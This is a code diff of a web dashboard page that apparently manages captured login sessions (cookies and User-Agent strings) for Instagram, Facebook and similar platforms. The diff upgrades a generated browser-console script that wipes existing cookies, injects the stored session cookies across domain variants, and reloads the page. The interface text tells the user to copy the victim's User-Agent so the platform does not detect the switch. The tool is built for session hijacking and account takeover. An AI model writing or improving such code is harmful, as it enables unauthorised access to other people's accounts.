@@ -6,7 +6,7 @@ import GlassCard from "@/components/GlassCard";
 import { 
   Search, Clock, Globe, ExternalLink, 
   Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
-  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info
+  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 
@@ -134,24 +134,48 @@ export default function SessionsPage() {
     return `(function() {
   const cookies = ${JSON.stringify(cookies)};
   console.clear();
-  console.log('%c [SessionSafe] Limpiando Sesión... ', 'background: #f59e0b; color: #fff; font-weight: bold; padding: 5px;');
+  console.log('%c [SessionSafe] INICIANDO RESTAURACIÓN DEEP ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px; border-radius: 3px;');
   
+  // 1. Limpieza agresiva
+  console.log('%c [1/3] Limpiando estado previo... ', 'color: #f59e0b;');
   document.cookie.split(";").forEach(function(c) { 
     const name = c.split("=")[0].trim();
+    const domain = location.hostname;
+    const baseDomain = domain.split('.').slice(-2).join('.');
+    
     document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
-    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname.replace(/^www\./, ".");
+    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + domain;
+    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + domain;
+    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=." + baseDomain;
   });
 
-  console.log('%c [SessionSafe] Inyectando ' + cookies.length + ' cookies... ', 'background: #2563eb; color: #fff; font-weight: bold; padding: 5px;');
+  // 2. Inyección optimizada
+  console.log('%c [2/3] Inyectando ' + cookies.length + ' cookies... ', 'color: #3b82f6;');
+  let HttpOnlyCount = 0;
   
   cookies.forEach(c => {
+    if (c.http_only) HttpOnlyCount++;
     try {
-      document.cookie = c.name + '=' + encodeURIComponent(c.value) + '; domain=' + c.domain + '; path=' + (c.path || '/') + '; SameSite=Lax; Secure';
-    } catch (e) {}
+      // Usamos el valor directamente para evitar sobre-codificación
+      let cookieStr = c.name + '=' + c.value + 
+                    '; domain=' + (c.domain.startsWith('.') ? c.domain : ('.' + c.domain)) + 
+                    '; path=' + (c.path || '/') + 
+                    '; SameSite=Lax; Secure';
+      document.cookie = cookieStr;
+    } catch (e) {
+      console.error('Error inyectando:', c.name, e);
+    }
   });
-  
-  console.log('%c ¡ÉXITO! Recargando... ', 'color: #10b981; font-weight: bold;');
-  setTimeout(() => location.reload(), 1500);
+
+  // 3. Verificación y log final
+  console.log('%c [3/3] Verificando resultados... ', 'color: #10b981;');
+  if (HttpOnlyCount > 0) {
+    console.warn('%c [!] ATENCIÓN: Se detectaron ' + HttpOnlyCount + ' cookies HttpOnly. ', 'background: #7c2d12; color: #fbbf24; padding: 3px;');
+    console.warn('Nota: Las cookies HttpOnly (como el sessionid a veces) NO se pueden inyectar desde la consola. Si el login falla, usa la extensión.');
+  }
+
+  console.log('%c ¡CAPTURA COMPLETADA! Recargando en 2s... ', 'background: #10b981; color: #fff; font-weight: bold; padding: 5px;');
+  setTimeout(() => location.reload(), 2000);
 })();`;
   };
 
@@ -198,7 +222,7 @@ export default function SessionsPage() {
             />
           </div>
           <button onClick={() => {setLoading(true); fetchSessions();}} className="glass p-2.5 rounded-xl">
-            <Clock size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
+            <RefreshCw size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
           </button>
         </div>
       </header>
@@ -288,12 +312,12 @@ export default function SessionsPage() {
                         <div className="flex flex-col items-center justify-center gap-2 p-6 bg-red-500/5 rounded-xl border border-red-500/10 text-center">
                           <Info size={24} className="text-red-400/50" />
                           <p className="text-xs text-gray-400 max-w-[200px]">
-                            Esta sesión es antigua y no tiene User-Agent guardado. Captura una nueva para ver este dato.
+                            Esta sesión es antigua y no tiene User-Agent guardado.
                           </p>
                         </div>
                       )}
                       <p className="text-[10px] text-gray-500 mt-3 leading-tight italic">
-                        * Usa una extensión como "User-Agent Switcher" y pega este texto EXACTAMENTE antes de inyectar las cookies para engañar a {accountMap[selectedSession.id]?.platform}.
+                        * Usa la extensión "User-Agent Switcher" con este texto antes de inyectar.
                       </p>
                     </div>
                   </div>
@@ -305,7 +329,7 @@ export default function SessionsPage() {
                       </div>
                       <div className="flex gap-4">
                         <button onClick={() => setSelectedSession(null)} className="px-8 py-5 rounded-2xl glass font-bold text-gray-400 hover:bg-white/5 transition-all outline-none">
-                          CANCELAR
+                          CERRAR
                         </button>
                         <button 
                           onClick={copyToClipboard}
@@ -317,7 +341,7 @@ export default function SessionsPage() {
                     </div>
                     <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/20">
                        <p className="text-[11px] text-amber-200/80 leading-snug">
-                         <b>PASOS:</b> 1. Cambia tu User-Agent al de arriba. 2. Ve a {accountMap[selectedSession.id]?.platform.toLowerCase()}.com. 3. Pulsa "ENTRAR AHORA" y pega en la consola (F12).
+                         <b>IMPORTANTE:</b> Si después de inyectar te sale un cuadro de "No has iniciado sesión", es porque Instagram detectó el cambio. Asegúrate de tener el **mismo User-Agent** que está a la izquierda.
                        </p>
                     </div>
                   </div>
